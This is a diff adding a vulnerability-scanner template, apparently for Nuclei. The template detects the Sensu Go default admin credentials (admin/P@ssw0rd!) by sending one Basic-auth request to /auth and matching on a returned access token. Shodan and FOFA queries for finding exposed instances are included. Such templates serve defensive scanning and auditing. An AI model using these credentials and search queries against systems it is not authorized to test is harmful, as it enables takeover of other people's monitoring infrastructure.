@@ -1,0 +1,47 @@
+id: sensu-go-default-login
+
+info:
+  name: Sensu Go - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Sensu Go contains a default login caused by the backend seeding the cluster admin account admin with the password P@ssw0rd! when SENSU_BACKEND_CLUSTER_ADMIN_USERNAME and SENSU_BACKEND_CLUSTER_ADMIN_PASSWORD are not set, letting remote attackers obtain an admin session and control the whole monitoring cluster.
+  reference:
+    - https://docs.sensu.io/sensu-go/latest/operations/deploy-sensu/install-sensu/
+    - https://docs.sensu.io/sensu-go/latest/operations/control-access/create-read-only-user/
+    - https://hub.docker.com/r/sensu/sensu
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: sensu
+    product: sensu_go
+    shodan-query: http.favicon.hash:-749942143
+    fofa-query: icon_hash="-749942143" || body="Sensu"
+  tags: sensu,sensu-go,default-login
+
+variables:
+  username: "admin"
+  password: "P@ssw0rd!"
+
+http:
+  - raw:
+      - |
+        GET /auth HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'regex("\"access_token\"\\s*:\\s*\"eyJ", body)'
+          - 'contains_all(body, "\"refresh_token\"", "\"expires_at\"")'
+          - 'contains(content_type, "json")'
+          - 'status_code == 200'
+        condition: and
